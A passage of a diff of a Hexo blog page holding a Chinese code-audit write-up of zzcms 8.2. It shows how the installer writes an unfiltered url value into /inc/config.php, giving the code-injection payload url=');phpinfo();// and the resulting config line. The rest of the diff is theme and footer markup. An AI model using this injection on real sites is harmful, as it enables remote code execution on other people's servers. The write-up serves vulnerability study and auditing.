class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("'</span>.$msg.<span class="string">'");window.history.back();&lt;/script&gt;'</span>;</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">		</span><br><span class="line">        $conn=connect($db_host,$db_user,$db_pass,<span class="string">''</span>,$db_port);</span><br><span class="line">        <span class="keyword">if</span>(!$conn) dexit(<span class="string">'无法连接到数据库服务器，请检查配置'</span>);</span><br><span class="line">        $db_name <span class="keyword">or</span> dexit(<span class="string">'请填写数据库名'</span>);</span><br><span class="line">        <span class="keyword">if</span>(!select_db($db_name)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(!query(<span class="string">"CREATE DATABASE $db_name"</span>)) dexit(<span class="string">'指定的数据库不存在\n\n系统尝试创建失败，请通过其他方式建立数据库'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">//保存配置文件</span></span><br><span class="line">        $fp=<span class="string">"../inc/config.php"</span>;</span><br><span class="line">        $f = fopen($fp,<span class="string">'r'</span>);</span><br><span class="line">        $str = fread($f,filesize($fp));</span><br><span class="line">        fclose($f);</span><br><span class="line">        $str=str_replace(<span class="string">"define('sqlhost','"</span>.sqlhost.<span class="string">"')"</span>,<span class="string">"define('sqlhost','$db_host')"</span>,$str) ;</span><br><span class="line">        $str=str_replace(<span class="string">"define('sqlport','"</span>.sqlport.<span class="string">"')"</span>,<span class="string">"define('sqlport','$db_port')"</span>,$str) ;</span><br><span class="line">        $str=str_replace(<span class="string">"define('sqldb','"</span>.sqldb.<span class="string">"')"</span>,<span class="string">"define('sqldb','$db_name')"</span>,$str) ;</span><br><span class="line">        $str=str_replace(<span class="string">"define('sqluser','"</span>.sqluser.<span class="string">"')"</span>,<span class="string">"define('sqluser','$db_user')"</span>,$str) ;</span><br><span class="line">        $str=str_replace(<span class="string">"define('sqlpwd','"</span>.sqlpwd.<span class="string">"')"</span>,<span class="string">"define('sqlpwd','$db_pass')"</span>,$str) ;</span><br><span class="line">        $str=str_replace(<span class="string">"define('siteurl','"</span>.siteurl.<span class="string">"')"</span>,<span class="string">"define('siteurl','$url')"</span>,$str) ;</span><br><span class="line">        $str=str_replace(<span class="string">"define('logourl','"</span>.logourl.<span class="string">"')"</span>,<span class="string">"define('logourl','$url/image/logo.png')"</span>,$str) ;</span><br><span class="line">        $f=fopen($fp,<span class="string">"w+"</span>);<span class="comment">//fopen()的其它开关请参看相关函数</span></span><br><span class="line">        fputs($f,$str);<span class="comment">//把替换后的内容写入文件</span></span><br><span class="line">        fclose($f);</span><br><span class="line">		<span class="comment">//创建数据</span></span><br><span class="line">        <span class="keyword">include</span> <span class="string">'step_'</span>.$step.<span class="string">'.php'</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'6'</span>:</span><br><span class="line">        <span class="keyword">include</span> <span class="string">'step_'</span>.$step.<span class="string">'.php'</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>该分支中先定义了一个<code>dexit()</code>函数，之后进行了数据库连接：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$conn=connect($db_host,$db_user,$db_pass,<span class="string">''</span>,$db_port);</span><br><span class="line"><span class="keyword">if</span>(!$conn) dexit(<span class="string">'无法连接到数据库服务器，请检查配置'</span>);</span><br><span class="line">$db_name <span class="keyword">or</span> dexit(<span class="string">'请填写数据库名'</span>);</span><br><span class="line"><span class="keyword">if</span>(!select_db($db_name)) &#123;</span><br><span class="line">    <span class="keyword">if</span>(!query(<span class="string">"CREATE DATABASE $db_name"</span>)) dexit(<span class="string">'指定的数据库不存在\n\n系统尝试创建失败，请通过其他方式建立数据库'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到如果连接失败，就会调用 dexit() 函数终止脚本的执行，这样下面的代码就不会执行。为了让数据库正确连接，则 db_host、db_user、db_pass、db_port、db_name 这4个变量我们就不可控。<br>接下来是对<code>/inc/config.php</code>文件进行操作，该文件里面定义了安装完 cms 后需要用到的各种常量。<br><code>/install/index.php</code>中先读取了<code>/inc/config.php</code>的内容，并根据我们安装时设置的初始化信息对该内容进行修改，之后再存回<code>/inc/config.php</code>中。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//保存配置文件</span></span><br><span class="line">$fp=<span class="string">"../inc/config.php"</span>;</span><br><span class="line">$f = fopen($fp,<span class="string">'r'</span>);</span><br><span class="line">$str = fread($f,filesize($fp));</span><br><span class="line">fclose($f);</span><br><span class="line">$str=str_replace(<span class="string">"define('sqlhost','"</span>.sqlhost.<span class="string">"')"</span>,<span class="string">"define('sqlhost','$db_host')"</span>,$str) ;</span><br><span class="line">$str=str_replace(<span class="string">"define('sqlport','"</span>.sqlport.<span class="string">"')"</span>,<span class="string">"define('sqlport','$db_port')"</span>,$str) ;</span><br><span class="line">$str=str_replace(<span class="string">"define('sqldb','"</span>.sqldb.<span class="string">"')"</span>,<span class="string">"define('sqldb','$db_name')"</span>,$str) ;</span><br><span class="line">$str=str_replace(<span class="string">"define('sqluser','"</span>.sqluser.<span class="string">"')"</span>,<span class="string">"define('sqluser','$db_user')"</span>,$str) ;</span><br><span class="line">$str=str_replace(<span class="string">"define('sqlpwd','"</span>.sqlpwd.<span class="string">"')"</span>,<span class="string">"define('sqlpwd','$db_pass')"</span>,$str) ;</span><br><span class="line">$str=str_replace(<span class="string">"define('siteurl','"</span>.siteurl.<span class="string">"')"</span>,<span class="string">"define('siteurl','$url')"</span>,$str) ;</span><br><span class="line">$str=str_replace(<span class="string">"define('logourl','"</span>.logourl.<span class="string">"')"</span>,<span class="string">"define('logourl','$url/image/logo.png')"</span>,$str) ;</span><br><span class="line">$f=fopen($fp,<span class="string">"w+"</span>);<span class="comment">//fopen()的其它开关请参看相关函数</span></span><br><span class="line">fputs($f,$str);<span class="comment">//把替换后的内容写入文件</span></span><br><span class="line">fclose($f);</span><br></pre></td></tr></table></figure>
+
+<p>因为数据库连接的原因，前几个变量的值我们不可控，而 url 变量我们是可控，如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$str=str_replace(<span class="string">"define('siteurl','"</span>.siteurl.<span class="string">"')"</span>,<span class="string">"define('siteurl','$url')"</span>,$str) ;</span><br><span class="line">$str=str_replace(<span class="string">"define('logourl','"</span>.logourl.<span class="string">"')"</span>,<span class="string">"define('logourl','$url/image/logo.png')"</span>,$str) ;</span><br></pre></td></tr></table></figure>
+
+<p>str 的内容就是<code>/inc/config.php</code>中的内容，看一下相应部分：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /inc/config.php line 9</span></span><br><span class="line">define(<span class="string">'siteurl'</span>,<span class="string">'http://cp.com'</span>) ;<span class="comment">//网站地址</span></span><br></pre></td></tr></table></figure>
+
+<p>这里我们只要闭合单引号，并注释后面部分即可。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">url=<span class="string">');phpinfo();//</span></span><br></pre></td></tr></table></figure>
+
+<p>经过替换后<code>/inc/config.php</code>的内容被更改为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 原来：define('siteurl','http://cp.com') ;//网站地址</span></span><br><span class="line">define(<span class="string">'siteurl'</span>,<span class="string">''</span>);phpinfo();<span class="comment">//') ;//网站地址</span></span><br></pre></td></tr></table></figure>
+
 <p>利用该漏洞后，我们只要访问<code>/inc/config.php</code>文件，就可以看 phpinfo(); 的内容。<br>payload :</p>
 <p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/34.png" alt="34"></p>
 <p>可以看到我们已经修改了<code>/inc/config.php</code>中相应部分的内容：</p>
@@ -510,374 +340,67 @@
 <p>在实际的场景中，基本上没有该漏洞的利用条件。第一个条件是要知道数据库的账号和密码等信息，这可以结合前面的 sql 注入去实现。第二个同网站重装漏洞一样，在网站搭建完成后，管理员没有删除<code>/install</code>文件夹及里面相应的文件。</p>
 <p>ref:<br><a href="https://mochazz.github.io/2018/02/12/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bzzcms82/" target="_blank" rel="noopener">https://mochazz.github.io/2018/02/12/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bzzcms82/</a><br><a href="https://www.freebuf.com/vuls/161888.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/161888.html</a><br><a href="https://www.freebuf.com/column/165934.html" target="_blank" rel="noopener">https://www.freebuf.com/column/165934.html</a><br><a href="https://bbs.ichunqiu.com/thread-35355-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-35355-1-1.html</a></p>
 
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
+      </div>
+      <div class="post-copyright">
+    <p class="copyright-item">
+      <span>Author: </span>
+      <a href="http://yoursite.com">ll</a>
+    </p>
+    <p class="copyright-item">
+      <span>Link: </span>
+      <a href="http://yoursite.com/2019/04/18/zzcms 8.2 代码审计/">http://yoursite.com/2019/04/18/zzcms 8.2 代码审计/</a>
+    </p>
+    <p class="copyright-item">
+      <span>License: </span><a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>
+    </p>
+  </div>
+      <footer class="post-footer">
         <div class="post-tags">
-          
-            <a href="/tags/audit/" rel="tag"># audit</a>
-          
-        </div>
-      
-
-      
-      
-      
-
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
-            
-              <a href="/2019/04/01/php反序列化/" rel="next" title="php反序列化">
-                <i class="fa fa-chevron-left"></i> php反序列化
-              </a>
-            
-          </div>
-
-          <span class="post-nav-divider"></span>
-
-          <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/04/24/dedecms v5.7 后台代码执行/" rel="prev" title="dedecms v5.7 后台代码执行">
-                dedecms v5.7 后台代码执行 <i class="fa fa-chevron-right"></i>
-              </a>
-            
-          </div>
-        </div>
-      
-
-      
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-
-    <div class="post-spread">
-      
-    </div>
-  </div>
-
-
-          </div>
-          
-
-
-          
-
-  
-
-
-
-        </div>
+            <a href="/tags/audit/">audit</a>
+            </div>
         
-          
-  
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
-    </div>
-  </div>
+        <nav class="post-nav"><a class="prev" href="/2019/04/24/dedecms v5.7 后台代码执行/">
+        <i class="iconfont icon-left"></i>
+        <span class="prev-text nav-default">dedecms v5.7 后台代码执行</span>
+        <span class="prev-text nav-mobile">Prev</span>
+      </a>
+    <a class="next" href="/2019/04/01/php反序列化/">
+        <span class="next-text nav-default">php反序列化</span>
+        <span class="prev-text nav-mobile">Next</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    </nav></footer>
+    </article></div><div class="comments" id="comments"></div></div>
+      </main>
 
-  <aside id="sidebar" class="sidebar">
-    
-    <div class="sidebar-inner">
-
-      
-
-      
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            Table of Contents
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            Overview
-          </li>
-        </ul>
-      
-
-      <section class="site-overview-wrap sidebar-panel">
-        <div class="site-overview">
-          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-            
-              <p class="site-author-name" itemprop="name">ll</p>
-              <p class="site-description motion-element" itemprop="description"></p>
-          </div>
-
-          <nav class="site-state motion-element">
-
-            
-              <div class="site-state-item site-state-posts">
-              
-                <a href="/archives/">
-              
-                  <span class="site-state-item-count">7</span>
-                  <span class="site-state-item-name">posts</span>
-                </a>
-              </div>
-            
-
-            
-
-            
-              
-              
-              <div class="site-state-item site-state-tags">
-                <a href="/tags/index.html">
-                  <span class="site-state-item-count">4</span>
-                  <span class="site-state-item-name">tags</span>
-                </a>
-              </div>
-            
-
-          </nav>
-
-          
-
-          
-
-          
-          
-
-          
-          
-
-          
-
-        </div>
-      </section>
-
-      
-      <!--noindex-->
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-              
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sql注入"><span class="nav-number">2.</span> <span class="nav-text">sql注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#文件删除"><span class="nav-number">3.</span> <span class="nav-text">文件删除</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#xss"><span class="nav-number">4.</span> <span class="nav-text">xss</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#文件上传"><span class="nav-number">5.</span> <span class="nav-text">文件上传</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#网站重装"><span class="nav-number">6.</span> <span class="nav-text">网站重装</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#getshell"><span class="nav-number">7.</span> <span class="nav-text">getshell</span></a></li></ol></div>
-            
-
-          </div>
-        </section>
-      <!--/noindex-->
-      
-
-      
-
-    </div>
-  </aside>
-
-
-        
-      </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
-  <span class="with-love">
-    <i class="fa fa-user"></i>
+      <footer id="footer" class="footer"><div class="social-links"><a href="mailto:your@email.com" class="iconfont icon-email" title="email"></a>
+        <a href="/atom.xml" class="iconfont icon-rss" title="rss"></a>
+    </div><div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" href="https://hexo.io/">Hexo</a>
   </span>
-  <span class="author" itemprop="copyrightHolder">ll</span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - 
+    <a class="theme-link" href="https://github.com/ahonn/hexo-theme-even">Even</a>
+  </span>
 
-  
+  <span class="copyright-year">&copy;2015 - 2019<span class="heart">
+      <i class="iconfont icon-heart"></i>
+    </span>
+    <span class="author">ll</span>
+  </span>
 </div>
+</footer>
 
-
-  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
-
-
-
-  <span class="post-meta-divider">|</span>
-
-
-
-  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
-
-
-
-
-        
-
-
-
-
-
-
-
-        
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
       </div>
-    </footer>
-
-    
-      <div class="back-to-top">
-        <i class="fa fa-arrow-up"></i>
-        
-      </div>
-    
-
-    
-
-  </div>
-
-  
-
-<script type="text/javascript">
-  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
-    window.Promise = null;
-  }
-</script>
-
-
-
-
-
-
-
-
-
-  
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  
-    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
-  
-
-
-  
-
-
-  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
-
-  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
-
-
-
-  
-  
-
-  
-  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
-<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
-
-
-
-  
-
-
-  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
-
-
-
-  
-
-
-  
-
-
-
-
-	
-
-
-
-
-
-  
-
-
-
-
-
-  
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-
-
-
-
-  
-
-  
-
-  
-
-  
-  
-
-  
-
-  
-
-  
-
+    </div><script type="text/javascript" src="/lib/jquery/jquery.min.js"></script>
+  <script type="text/javascript" src="/lib/slideout/slideout.js"></script>
+  <script type="text/javascript" src="/lib/fancybox/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/lib/pjax/jquery.pjax.min.js"></script>
+  <script type="text/javascript" src="/lib/nprogress/nprogress.min.js"></script>
+  <script type="text/javascript" src="/js/src/even.js?v=2.11.0"></script>
 </body>
 </html>
